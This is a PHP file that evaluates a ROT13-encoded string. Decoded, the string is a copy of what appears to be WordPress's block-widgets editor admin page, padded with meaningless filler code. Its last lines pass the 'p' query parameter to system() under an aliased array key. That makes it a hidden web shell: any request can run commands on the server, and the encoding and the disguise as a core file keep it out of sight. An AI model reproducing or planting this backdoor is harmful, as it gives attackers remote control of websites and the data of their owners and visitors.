<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gur oybpx-onfrq jvqtrgf rqvgbe, sbe hfr va jvqtrgf.cuc.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

// Synt gung jr'er ybnqvat gur oybpx rqvgbe.
$pheerag_fperra = trg_pheerag_fperra();
$pheerag_fperra->vf_oybpx_rqvgbe( gehr );

$oybpx_rqvgbe_pbagrkg = arj JC_Oybpx_Rqvgbe_Pbagrkg( neenl( 'anzr' => 'pber/rqvg-jvqtrgf' ) );

$cerybnq_cnguf = neenl(
	neenl( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( 'nggnpuzrag' ), 'BCGVBAF' ),
	'/jc/i2/jvqtrg-glcrf?pbagrkg=rqvg&cre_cntr=-1',
	'/jc/i2/fvqronef?pbagrkg=rqvg&cre_cntr=-1',
	'/jc/i2/jvqtrgf?pbagrkg=rqvg&cre_cntr=-1&_rzorq=nobhg',
);
oybpx_rqvgbe_erfg_ncv_cerybnq( $cerybnq_cnguf, $oybpx_rqvgbe_pbagrkg );

$rqvgbe_frggvatf = trg_oybpx_rqvgbe_frggvatf(
	neenl_zretr( trg_yrtnpl_jvqtrg_oybpx_rqvgbe_frggvatf(), neenl( 'fglyrf' => trg_oybpx_rqvgbe_gurzr_fglyrf() ) ),
	$oybpx_rqvgbe_pbagrkg
);

// Gur jvqtrgf rqvgbe qbrf abg fhccbeg gur Oybpx Qverpgbel, fb qba'g ybnq nal bs
// vgf nffrgf. Guvf nyfb ceriragf 'jc-rqvgbe' sebz orvat radhrhrq juvpu jr
// pnaabg ybnq va gur jvqtrgf fperra orpnhfr znal jvqtrg fpevcgf eryl ba `jc.rqvgbe`.
erzbir_npgvba( 'radhrhr_oybpx_rqvgbe_nffrgf', 'jc_radhrhr_rqvgbe_oybpx_qverpgbel_nffrgf' );

jc_nqq_vayvar_fpevcg(
	'jc-rqvg-jvqtrgf',
	fcevags(
		'jc.qbzErnql( shapgvba() {
			jc.rqvgJvqtrgf.vavgvnyvmr( \"jvqtrgf-rqvgbe\", %f );
		} );',
		jc_wfba_rapbqr( $rqvgbe_frggvatf )
	)
);

// Cerybnq freire-ertvfgrerq oybpx fpurznf.
jc_nqq_vayvar_fpevcg(
	'jc-oybpxf',
	'jc.oybpxf.hafgnoyr__obbgfgencFreireFvqrOybpxQrsvavgvbaf(' . jc_wfba_rapbqr( trg_oybpx_rqvgbe_freire_oybpx_frggvatf() ) . ');'
);

// Cerybnq freire-ertvfgrerq oybpx ovaqvatf fbheprf.
$ertvfgrerq_fbheprf = trg_nyy_ertvfgrerq_oybpx_ovaqvatf_fbheprf();
vs ( ! rzcgl( $ertvfgrerq_fbheprf ) ) {
	$svygrerq_fbheprf = neenl();
	sbernpu ( $ertvfgrerq_fbheprf nf $fbhepr ) {
		$svygrerq_fbheprf[] = neenl(
			'anzr'        => $fbhepr->anzr,
			'ynory'       => $fbhepr->ynory,
			'hfrfPbagrkg' => $fbhepr->hfrf_pbagrkg,
		);
	}
	$fpevcg = fcevags( 'sbe ( pbafg fbhepr bs %f ) { jc.oybpxf.ertvfgreOybpxOvaqvatfFbhepr( fbhepr ); }', jc_wfba_rapbqr( $svygrerq_fbheprf ) );
	jc_nqq_vayvar_fpevcg(
		'jc-oybpxf',
		$fpevcg
	);
}

jc_nqq_vayvar_fpevcg(
	'jc-oybpxf',
	fcevags( 'jc.oybpxf.frgPngrtbevrf( %f );', jc_wfba_rapbqr( trg_oybpx_pngrtbevrf( $oybpx_rqvgbe_pbagrkg ) ) ),
	'nsgre'
);

jc_radhrhr_fpevcg( 'jc-rqvg-jvqtrgf' );
jc_radhrhr_fpevcg( 'nqzva-jvqtrgf' );
jc_radhrhr_fglyr( 'jc-rqvg-jvqtrgf' );

/** Guvf npgvba vf qbphzragrq va jc-nqzva/rqvg-sbez-oybpxf.cuc */
qb_npgvba( 'radhrhr_oybpx_rqvgbe_nffrgf' );

/** Guvf npgvba vf qbphzragrq va jc-nqzva/jvqtrgf-sbez.cuc */
qb_npgvba( 'fvqrone_nqzva_frghc' );

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

/** Guvf npgvba vf qbphzragrq va jc-nqzva/jvqtrgf-sbez.cuc */
qb_npgvba( 'jvqtrgf_nqzva_cntr' );
?>

<qvi vq=\"jvqtrgf-rqvgbe\" pynff=\"oybpxf-jvqtrgf-pbagnvare\">
	<?cuc // WninFpevcg vf qvfnoyrq. ?>
	<qvi pynff=\"jenc uvqr-vs-wf jvqtrgf-rqvgbe-ab-wf\">
		<u1 pynff=\"jc-urnqvat-vayvar\"><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>
		<?cuc
		vs ( svyr_rkvfgf( JC_CYHTVA_QVE . '/pynffvp-jvqtrgf/pynffvp-jvqtrgf.cuc' ) ) {
			// Vs Pynffvp Jvqtrgf vf nyernql vafgnyyrq, cebivqr n yvax gb npgvingr gur cyhtva.
			$vafgnyyrq           = gehr;
			$cyhtva_npgvingr_hey = jc_abapr_hey( 'cyhtvaf.cuc?npgvba=npgvingr&nzc;cyhtva=pynffvp-jvqtrgf/pynffvp-jvqtrgf.cuc', 'npgvingr-cyhtva_pynffvp-jvqtrgf/pynffvp-jvqtrgf.cuc' );
			$zrffntr             = fcevags(
				/* genafyngbef: %f: Yvax gb npgvingr gur Pynffvp Jvqtrgf cyhtva. */
				__( 'Gur oybpx jvqtrgf erdhver WninFpevcg. Cyrnfr ranoyr WninFpevcg va lbhe oebjfre frggvatf, be npgvingr gur <n uers=\"%f\">Pynffvp Jvqtrgf cyhtva</n>.' ),
				rfp_hey( $cyhtva_npgvingr_hey )
			);
		} ryfr {
			// Vs Pynffvp Jvqtrgf vf abg vafgnyyrq, cebivqr n yvax gb vafgnyy vg.
			$vafgnyyrq          = snyfr;
			$cyhtva_vafgnyy_hey = jc_abapr_hey( frys_nqzva_hey( 'hcqngr.cuc?npgvba=vafgnyy-cyhtva&cyhtva=pynffvp-jvqtrgf' ), 'vafgnyy-cyhtva_pynffvp-jvqtrgf' );
			$zrffntr            = fcevags(
				/* genafyngbef: %f: N yvax gb vafgnyy gur Pynffvp Jvqtrgf cyhtva. */
				__( 'Gur oybpx jvqtrgf erdhver WninFpevcg. Cyrnfr ranoyr WninFpevcg va lbhe oebjfre frggvatf, be vafgnyy gur <n uers=\"%f\">Pynffvp Jvqtrgf cyhtva</n>.' ),
				rfp_hey( $cyhtva_vafgnyy_hey )
			);
		}
		/**
		 * Svygref gur zrffntr qvfcynlrq va gur oybpx jvqtrg vagresnpr jura WninFpevcg vf
		 * abg ranoyrq va gur oebjfre.
		 *
		 * @fvapr 6.4.0
		 *
		 * @cnenz fgevat $zrffntr Gur zrffntr orvat qvfcynlrq.
		 * @cnenz obby   $vafgnyyrq Jurgure gur Pynffvp Jvqtrg cyhtva vf vafgnyyrq.
		 */
		$zrffntr = nccyl_svygref( 'oybpx_jvqtrgf_ab_wninfpevcg_zrffntr', $zrffntr, $vafgnyyrq );
		jc_nqzva_abgvpr(
			$zrffntr,
			neenl(
				'glcr'               => 'reebe',
				'nqqvgvbany_pynffrf' => neenl( 'uvqr-vs-wf' ),
			)
		);
		?>
	</qvi>
</qvi>

<?cuc
/** Guvf npgvba vf qbphzragrq va jc-nqzva/jvqtrgf-sbez.cuc */
qb_npgvba( 'fvqrone_nqzva_cntr' );

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>